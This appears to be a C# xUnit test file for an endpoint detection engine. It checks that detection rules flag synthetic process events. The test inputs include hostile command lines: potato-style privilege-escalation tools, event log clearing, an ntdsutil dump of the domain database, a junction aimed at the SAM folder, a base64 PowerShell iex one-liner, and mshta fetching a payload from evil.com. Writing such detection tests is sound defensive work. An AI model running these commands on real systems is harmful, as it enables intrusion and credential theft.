using System;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    public class RulesTests
    {
        private static FusedTelemetryContext MakeContext(ProcessTelemetry pt)
        {
            return new FusedTelemetryContext
            {
                ProcessId = pt.ProcessId,
                ProcessName = pt.ProcessName,
                TriggeringEvent = pt
            };
        }

        [Fact]
        public void PrivilegeEscalationRule_DetectsPotatoAndPrintSpoof()
        {
            var rule = new PrivilegeEscalationRule();
            
            // Test GodPotato/JuicyPotato
            var pt1 = new ProcessTelemetry
            {
                ProcessName = "godpotato.exe",
                ImagePath = @"C:\Temp\godpotato.exe",
                CommandLine = "godpotato.exe -cmd cmd.exe",
                ProcessId = 1234
            };
            var context1 = MakeContext(pt1);
            var result1 = rule.Evaluate(context1);
            Assert.NotNull(result1);
            Assert.Equal("PrivilegeEscalationRule", result1.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result1.AuthorizedResponse);

            // Test PrintSpoofer
            var pt2 = new ProcessTelemetry
            {
                ProcessName = "PrintSpoofer.exe",
                ImagePath = @"C:\Temp\PrintSpoofer.exe",
                CommandLine = "PrintSpoofer.exe -c cmd.exe",
                ProcessId = 1235
            };
            var context2 = MakeContext(pt2);
            var result2 = rule.Evaluate(context2);
            Assert.NotNull(result2);
        }

        [Fact]
        public void PrivilegeEscalationRule_DetectsWevtutilLogClearing()
        {
            var rule = new PrivilegeEscalationRule();

            var pt = new ProcessTelemetry
            {
                ProcessName = "wevtutil.exe",
                ImagePath = @"C:\Windows\System32\wevtutil.exe",
                CommandLine = "wevtutil.exe cl System",
                ProcessId = 1236
            };
            var context = MakeContext(pt);
            var result = rule.Evaluate(context);
            Assert.NotNull(result);
            Assert.Contains("wevtutil", result.Evidence);
        }

        [Fact]
        public void AttackToolsRule_DetectsEarthLamiaToolsets()
        {
            var rule = new AttackToolsRule();

            // Test fscan
            var pt1 = new ProcessTelemetry
            {
                ProcessName = "fscan.exe",
                ImagePath = @"C:\Temp\fscan.exe",
                CommandLine = "fscan.exe -h 192.168.1.1/24",
                ProcessId = 1237
            };
            var result1 = rule.Evaluate(MakeContext(pt1));
            Assert.NotNull(result1);
            Assert.Equal("AttackToolsRule", result1.RuleName);

            // Test rakshasa
            var pt2 = new ProcessTelemetry
            {
                ProcessName = "rakshasa.exe",
                ImagePath = @"C:\Temp\rakshasa.exe",
                CommandLine = "rakshasa.exe -p 1080",
                ProcessId = 1238
            };
            var result2 = rule.Evaluate(MakeContext(pt2));
            Assert.NotNull(result2);

            // Test ntdsutil
            var pt3 = new ProcessTelemetry
            {
                ProcessName = "ntdsutil.exe",
                ImagePath = @"C:\Windows\System32\ntdsutil.exe",
                CommandLine = "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\"",
                ProcessId = 1239
            };
            var result3 = rule.Evaluate(MakeContext(pt3));
            Assert.NotNull(result3);
        }

        [Fact]
        public void AttackToolsRule_DetectsJunctionLpeBlueHammer()
        {
            var rule = new AttackToolsRule();

            // Test mklink targeting SAM database
            var pt = new ProcessTelemetry
            {
                ProcessName = "cmd.exe",
                ImagePath = @"C:\Windows\System32\cmd.exe",
                CommandLine = @"cmd.exe /c mklink /j C:\Users\Admin\AppData\Local\Temp\samlink C:\Windows\System32\config",
                ProcessId = 1240
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("AttackToolsRule", result.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.Contains("Junction LPE", result.Evidence);
        }

        [Fact]
        public void ClickFixDetectionRule_DetectsSuspiciousDownloaderFromExplorer()
        {
            var rule = new ClickFixDetectionRule();

            var pt = new ProcessTelemetry
            {
                ProcessName = "powershell.exe",
                ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                CommandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"[System.Convert]::FromBase64String('aGVsbG8=') | iex\"",
                ParentProcessName = "explorer.exe",
                ProcessId = 1241
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("ClickFixDetectionRule", result.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.Contains("ClickFix", result.Evidence);
        }

        [Fact]
        public void DllSideloadingDetectionRule_DetectsSignedToolInWriteablePath()
        {
            var rule = new DllSideloadingDetectionRule();

            var pt = new ProcessTelemetry
            {
                ProcessName = "onedrive.exe",
                ImagePath = @"C:\Users\Admin\AppData\Local\Microsoft\OneDrive\onedrive.exe",
                CommandLine = "onedrive.exe /background",
                ProcessId = 1242
            };
            var result = rule.Evaluate(MakeContext(pt));
            Assert.NotNull(result);
            Assert.Equal("DllSideloadingDetectionRule", result.RuleName);
            Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
            Assert.Contains("sideloading", result.Reasoning, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public void DynamicRulesEvaluator_CorrectlyLoadsAndEvaluatesRules()
        {
            // Setup a temporary directory for test rules
            string tempDir = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "SentinelTestRules_" + Guid.NewGuid().ToString("N"));
            System.IO.Directory.CreateDirectory(tempDir);
            try
            {
                var testRule = new
                {
                    Name = "TestMshtaUrl",
                    EventType = "ProcessTelemetry",
                    Conditions = new[]
                    {
                        new { Field = "ProcessName", Operator = "Equals", Value = "mshta.exe" },
                        new { Field = "CommandLine", Operator = "Contains", Value = "http" }
                    },
                    Confidence = 0.95,
                    Tier = "Tier1Behavioral",
                    ResponseAction = "KillProcessTree",
                    Evidence = "Triggered test rule on {CommandLine}",
                    Reasoning = "Matches mshta with remote URL.",
                    SignalType = "SuspiciousProcess"
                };

                string jsonContent = System.Text.Json.JsonSerializer.Serialize(testRule);
                System.IO.File.WriteAllText(System.IO.Path.Combine(tempDir, "test_rule.json"), jsonContent);

                // Initialize evaluator pointed to test directory
                var logger = new Microsoft.Extensions.Logging.Abstractions.NullLogger<DynamicRulesEvaluator>();
                using var evaluator = new DynamicRulesEvaluator(tempDir, logger);

                var pt = new ProcessTelemetry
                {
                    ProcessName = "mshta.exe",
                    ImagePath = @"C:\Windows\System32\mshta.exe",
                    CommandLine = "mshta.exe http://evil.com/payload.hta",
                    ProcessId = 1243
                };

                var context = new FusedTelemetryContext
                {
                    ProcessId = pt.ProcessId,
                    ProcessName = pt.ProcessName,
                    TriggeringEvent = pt
                };

                var result = evaluator.Evaluate(context);
                Assert.NotNull(result);
                Assert.Equal("DynamicRule:TestMshtaUrl", result.RuleName);
                Assert.Equal(ResponseAction.KillProcessTree, result.AuthorizedResponse);
                Assert.Equal(0.95, result.Confidence);
                Assert.Contains("Triggered test rule on mshta.exe http://evil.com/payload.hta", result.Evidence);
            }
            finally
            {
                if (System.IO.Directory.Exists(tempDir))
                {
                    System.IO.Directory.Delete(tempDir, true);
                }
            }
        }
    }
}
